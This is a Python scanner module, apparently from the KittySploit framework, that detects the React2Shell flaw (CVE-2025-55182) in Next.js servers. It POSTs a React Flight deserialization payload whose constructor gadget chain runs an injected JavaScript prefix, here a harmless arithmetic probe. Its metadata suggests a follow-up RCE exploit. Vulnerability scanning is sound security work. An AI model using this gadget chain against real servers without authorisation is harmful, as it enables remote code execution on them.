#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect React2Shell (CVE-2025-55182) on Next.js / React Server Components."""

import json

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.nextjs_probe import ensure_nextjs_target


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'React2Shell CVE-2025-55182 Detection',
        'description': (
            'Detects CVE-2025-55182 (React2Shell) by sending a safe React Flight '
            'multipart payload that evaluates 7*7+1 via the _prefix gadget. '
            'Positive when the response reflects RSC deserialization behaviour.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'cve': 'CVE-2025-55182',
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2025-55182',
            'https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc',
            'https://github.com/assetnote/react2shell-scanner',
        ],
        'tags': ['web', 'scanner', 'react', 'nextjs', 'rsc', 'rce', 'react2shell', 'kev', 'cve2025'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': True,
            'produces': ['tech_hints', 'risk_signals'],
            'cost': 1.0,
            'noise': 0.5,
            'value': 1.5,
            'requires': {'tech_hints_any': ['nextjs', 'react']},
            'chain': {
                'produces_capabilities': [
                    {'capability': 'cve_indicator', 'from_detail': ''},
                    {'capability': 'rce_surface', 'from_detail': 'react flight'},
                ],
                'suggested_followups': ['exploits/multi/http/react2shell_cve_2025_55182_rce'],
            },
        },
    }

    action_path = OptString('', 'Next.js server action path (empty = /)', required=False)
    probe_marker = OptString('50', 'Expected arithmetic probe result (7*7+1)', required=False, advanced=True)

    def _flight_body(self, js_prefix: str) -> tuple[str, bytes, dict]:
        payload = {
            '0': '$1',
            '1': {
                'status': 'resolved_model',
                'reason': 0,
                '_response': '$4',
                'value': '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
                'then': '$2:then',
            },
            '2': '$@3',
            '3': [],
            '4': {
                '_prefix': js_prefix,
                '_formData': {'get': '$3:constructor:constructor'},
                '_chunks': '$2:_response:_chunks',
            },
        }
        boundary = f'----KittyReact2Shell{self.random_text(12)}'
        parts = []
        for key, val in payload.items():
            parts.append(
                f'--{boundary}\r\n'
                f'Content-Disposition: form-data; name="{key}"\r\n\r\n'
                f'{json.dumps(val)}\r\n'
            )
        parts.append(f'--{boundary}--\r\n')
        headers = {
            'Content-Type': f'multipart/form-data; boundary={boundary}',
            'next-action': 'x',
            'Accept': 'text/x-component',
        }
        return boundary, ''.join(parts).encode('utf-8'), headers

    def _probe_paths(self):
        custom = str(self.action_path or '').strip()
        if custom:
            return [custom if custom.startswith('/') else f'/{custom}']
        return ['/', '/api', '/_next/static']

    def run(self):
        if not ensure_nextjs_target(self):
            return False
        marker = str(self.probe_marker or '50').strip()
        js_prefix = f'console.log(7*7+1)//'
        _, body, headers = self._flight_body(js_prefix)
        for path in self._probe_paths():
            r = self.http_request(
                method='POST',
                path=path,
                headers=headers,
                data=body,
                allow_redirects=False,
            )
            if not r:
                continue
            text = (r.text or '')
            lower = text.lower()
            if marker in text:
                self.set_info(
                    severity='critical',
                    reason='React2Shell safe arithmetic probe reflected (CVE-2025-55182)',
                    path=path,
                    cve='CVE-2025-55182',
                )
                return True
            if r.status_code in (200, 500) and any(
                token in lower for token in ('react-server', 'flight', 'chunk', 'resolved_model', 'rsc')
            ):
                self.set_info(
                    severity='high',
                    reason='React Flight deserialization endpoint responds to React2Shell probe',
                    path=path,
                    cve='CVE-2025-55182',
                    confidence='medium',
                )
                return True
        return False
